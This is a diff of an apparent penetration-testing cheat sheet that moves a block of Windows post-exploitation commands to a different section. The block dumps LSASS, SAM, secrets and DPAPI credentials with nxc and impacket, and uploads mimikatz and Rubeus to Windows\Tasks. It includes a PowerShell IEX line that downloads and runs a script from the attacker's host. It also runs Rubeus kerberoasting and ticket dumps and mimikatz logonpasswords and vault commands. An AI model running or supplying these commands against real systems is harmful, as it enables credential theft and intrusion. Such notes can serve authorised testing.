@@ -90,43 +90,6 @@ sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_
 sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_$TARGET__24'
 sudo nmap -n -Pn -sS '$TARGET/24' --excludefile hosts_ -F --open --max-rate 50 -oA 'TCP_ALL_$TARGET__24'
 
-# dbf: Account Created
-## Automated Dump: DPAPI, LSASS, SAM + Secrets
-(t=$TARGET; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump 'dbf:123qweasdF!'@$t) | tee dump_$t
-
-## Upload Binaries
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
-
-## Winrm: Command Execution
-evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
-
-## DPAPI: SIDs, CREDENTIALS + MASTERKEYS
-mkdir dpapi
-winexe -U 'dbf%123qweasdF!' //$TARGET "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')\"" | tee dpapi_$TARGET
-evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
-download ...\S-1-5...\7dc6a492-36e2-4c2d-be66-ba29d263dda2 dpapi/
-download ...\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 dpapi/
-impacket-dpapi masterkey -file dpapi/7dc6a492-36e2-4c2d-be66-ba29d263dda2 -sid S-1-5... -password OF_DPAPI_USER | grep 'Decrypted key:'
-impacket-dpapi credential -file dpapi/936A68B5AC87C545C4A22D1AF264C8E9 -key 0xdcd70638e50e...
-
-## Rubeus: Tickets
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
-
-## Mimikatz: Dumps+
-rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
-privilege::debug
-token::elevate
-sekurlsa::logonpasswords
-lsadump::secrets
-vault::list
-vault::cred /patch
-sekurlsa::dpapi
-
-
 # Tech and Protocols
 ## Web
 [*] Web Shell
@@ -1244,6 +1207,42 @@ impacket-psexec $DOM/'$USERNAME:$PASSWORD'@$TARGET
 impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
 impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
+
+# dbf: Account Created
+## Automated Dump: DPAPI, LSASS, SAM + Secrets
+(t=$TARGET; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump 'dbf:123qweasdF!'@$t) | tee dump_$t
+
+## Upload Binaries
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
+
+## Winrm: Command Execution
+evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+
+## DPAPI: SIDs, CREDENTIALS + MASTERKEYS
+mkdir dpapi
+winexe -U 'dbf%123qweasdF!' //$TARGET "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')\"" | tee dpapi_$TARGET
+evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+download ...\S-1-5...\7dc6a492-36e2-4c2d-be66-ba29d263dda2 dpapi/
+download ...\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 dpapi/
+impacket-dpapi masterkey -file dpapi/7dc6a492-36e2-4c2d-be66-ba29d263dda2 -sid S-1-5... -password OF_DPAPI_USER | grep 'Decrypted key:'
+impacket-dpapi credential -file dpapi/936A68B5AC87C545C4A22D1AF264C8E9 -key 0xdcd70638e50e...
+
+## Rubeus: Tickets
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
+
+## Mimikatz: Dumps+
+rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+lsadump::secrets
+vault::list
+vault::cred /patch
+sekurlsa::dpapi
 
 # Post-Exploitation 
 ## Linux
